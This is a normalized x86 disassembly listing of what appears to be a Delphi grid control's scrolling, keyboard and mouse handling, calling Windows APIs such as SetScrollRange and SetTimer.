mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub eax ebx
mov ebx eax
mov eax 0x7f
sub eax ebx
mov ebx eax
jmp r-xdata
sub_477c88
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
call sub_446754
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ esi ]
call sub_476088
mov eax [ esi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x78 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi ]
call sub_4762c0
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi ]
mov al [ eax + 0x254 ]
sub al 0x1
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x238 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x258 ]
sub eax ebx
push eax
call MulDiv
mov edx eax
xor eax eax
call sub_477c08
pop ecx
mov edx [ ebp - 0x5c ]
mov eax [ esi ]
call sub_4790fc
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
call sub_43f5b4
sub eax [ ebp - 0x74 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x288 ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x23c ]
mov eax [ ebp - 0x10 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x25c ]
sub eax ebx
push eax
call MulDiv
mov edx eax
mov ax 0x1
call sub_477c08
pop ecx
push ebp
mov edx eax
xor eax eax
call sub_477c08
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx eax
cmp edx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx 0x4
xor edx edx
mov eax [ esi ]
call sub_477450
jmp r-xdata
sub_477dd4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_477df8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
movzx eax bx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_446450
push eax
call GetScrollRange
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
setne al
test bx bx
jne r-xdata
cmp bx 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x1
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x2
jne r-xdata
sub_477e68
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x5c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47610c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4762c0
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x70 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x6c ] edx
pop ecx
pop ecx
pop ebp
retn
sub_477ee0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
call sub_477e68
pop ecx
mov eax [ ebx ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
push 0xffffffff
push 0x0
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_446450
push eax
call SetScrollRange
push 0xffffffff
push 0x7f
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_446450
push eax
call SetScrollRange
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x10 ]
push eax
call sub_477dd4
pop ecx
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ edi ]
cmp eax [ ebx ]
jle r-xdata
sub_477f5c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
sub al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x78 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff90
call sub_477ee0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_4790fc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43f5b4
sub ebx eax
test ebx ebx
jge r-xdata
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_446450
push eax
call SetScrollRange
jmp r-xdata
xor ebx ebx
sub_477ff0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
add al 0xfe
sub al 0x2
jae r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x25c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x74 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff94
call sub_477ee0
pop ecx
sub_478034
push ebp
mov ebp esp
add esp 0xffffff84
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43f5b4
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
call sub_43f5f8
mov [ ebp - 0x2c ] eax
push ebp
xor eax eax
call sub_477df8
pop ecx
test al al
je r-xdata
push ebp
mov ax 0x1
call sub_477df8
pop ecx
test al al
je r-xdata
push 0x3
call GetSystemMetrics
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x254 ]
mov [ ebp - 0x79 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x254 ] 0x0
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_478142
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_477f5c
pop ecx
mov eax [ ebp - 0x8 ]
call sub_43f5f8
mov [ ebp - 0x2c ] eax
push ebp
call sub_477ff0
pop ecx
mov eax [ ebp - 0x8 ]
call sub_43f5b4
cmp eax [ ebp - 0x5c ]
je r-xdata
push 0x2
call GetSystemMetrics
add [ ebp - 0x5c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478149
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x79 ]
mov [ eax + 0x254 ] dl
retn
mov eax [ ebp - 0x8 ]
call sub_43f5b4
mov [ ebp - 0x5c ] eax
push ebp
call sub_477f5c
pop ecx
sub_478149
mov eax [ ebp - 0x8 ]
call sub_477c88
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0x78 ]
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x8 ]
call sub_477b88
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x25c ]
cmp eax [ ebp - 0x74 ]
je r-xdata
mov esp ebp
pop ebp
retn
sub_47818c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443258
or [ esi + 0x4 ] 0x10000
mov al [ ebx + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ ebx + 0x254 ]
sub al 0x1
je r-xdata
or [ esi + 0x4 ] 0x200000
or [ esi + 0x4 ] 0x100000
sub al 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x8
cmp [ ebx + 0x218 ] 0x1
jne r-xdata
or [ esi + 0x4 ] 0x800000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
jmp r-xdata
sub_478208
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
call sub_476088
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x25c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6c ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x68 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x6c ] 0x1
sub_478274
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi [ eax ]
cmp ebx edi
jge r-xdata
cmp edx edi
jle r-xdata
mov [ eax ] ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ eax + 0x4 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_4782b4
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov [ ebp - 0x6d ] cl
mov ebx edx
mov [ ebp - 0x64 ] eax
lea edi [ ebp - 0x64 ]
mov edx ebx
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
call sub_44527c
mov [ ebp - 0x89 ] 0x0
mov dx [ ebx ]
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
mov si 0xffb1
call sub_403368
test al al
jne r-xdata
mov eax [ edi ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov [ ebx ] 0x0
or esi 0xffffffff
mov esi 0x1
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0x25
jg r-xdata
movzx eax [ ebx ]
add eax 0xffffffdf
cmp eax 0x7
ja r-xdata
mov eax [ edi ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x80 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x7c ] edx
mov eax [ edi ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
push ebp
call sub_478208
pop ecx
test [ ebp - 0x6d ] 0x4
je r-xdata
sub eax 0x26
je r-xdata
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x88 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0x88 ]
mov eax [ edi ]
call sub_4762c0
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x84 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x78 ]
call sub_478274
mov edx [ edi ]
mov edx [ edx + 0x258 ]
mov eax [ ebp - 0x78 ]
cmp edx eax
jne r-xdata
jmp [ eax * 4 + jump_table_478360 ]
dec [ ebp - 0x7c ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
cmp eax 0x22
jg r-xdata
mov ecx [ ebp - 0x74 ]
mov edx eax
mov eax [ edi ]
call sub_47784c
mov edx [ edi ]
mov edx [ edx + 0x25c ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec [ ebp - 0x74 ]
jmp r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x25c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403368
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403368
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
sub [ ebp - 0x80 ] esi
jmp r-xdata
sub [ ebp - 0x7c ] esi
jmp r-xdata
sub eax 0x23
je r-xdata
je r-xdata
test [ ebp - 0x6d ] 0x1
setne dl
xor dl 0x1
push edx
mov ecx [ ebp - 0x7c ]
mov edx eax
mov eax [ edi ]
call sub_476d4c
mov edx [ edi ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x7c ]
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
push eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x80 ]
call sub_478274
mov edx [ edi ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x80 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x68 ]
imul esi
sub [ ebp - 0x80 ] eax
sub [ ebp - 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
imul esi
add [ ebp - 0x80 ] eax
add [ ebp - 0x78 ] eax
jmp r-xdata
add [ ebp - 0x80 ] esi
jmp r-xdata
add [ ebp - 0x7c ] esi
jmp r-xdata
inc [ ebp - 0x7c ]
jmp r-xdata
sub eax 0x49
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
add [ ebp - 0x74 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x89 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ edi ]
call sub_47949c
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
jmp r-xdata
test [ ebp - 0x6d ] 0x2
jne r-xdata
sub eax 0x18
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
test [ ebp - 0x6d ] 0x1
je r-xdata
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x74 ] eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x21c ]
cmp eax [ ebp - 0x80 ]
jg r-xdata
dec [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x80 ]
jle r-xdata
mov edx [ ebp - 0x80 ]
mov eax [ edi ]
call sub_479158
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
inc [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0x7c ]
jg r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x6d ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
dec [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x7c ]
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_478721
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445434
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
cmp [ ebx + 0x28d ] 0x0
je r-xdata
mov eax ebx
call sub_474fb8
mov eax ebx
call sub_474fa8
jmp r-xdata
mov [ esi ] 0x0
sub_478760
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_479664
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb8
call sub_403368
test al al
jne r-xdata
test bl bl
jne r-xdata
test [ ebp - 0x5 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
call sub_474f28
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_457570
test eax eax
jne r-xdata
xor eax eax
push ebp
push j_sub_40360c#2
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x5 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4411ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_476088
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
add eax 0x260
push eax
mov eax [ ebp - 0x4 ]
add eax 0x264
push eax
mov eax [ ebp - 0x4 ]
add eax 0x268
push eax
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403368
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43fde8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47602c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov esi [ ebp - 0x10 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_476a7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetTimer
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x10 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4776f4
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47766c
jmp r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4776f4
mov eax [ ebp - 0x4 ]
call sub_479740
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_416a38
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa2
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_474fb8
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_416a38
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa3
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_476bbc
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetTimer
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403368
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_476bbc
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetTimer
sub_478b2c
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_476088
mov al [ ebx + 0x28e ]
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_47602c
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x238 ]
jl r-xdata
dec eax
sub al 0x2
jb r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_441464
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x23c ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_476a7c
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x60 ]
inc eax
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebx + 0x268 ]
add eax esi
mov [ ebx + 0x264 ] eax
mov eax [ ebx + 0x268 ]
add eax edi
mov [ ebx + 0x264 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
cmp eax [ ebp - 0x8 ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_476a7c
mov al [ ebx + 0x28e ]
dec al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x210 ]
jne r-xdata
sub al 0x3
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47766c
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x214 ]
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_416a38
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_478f84
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
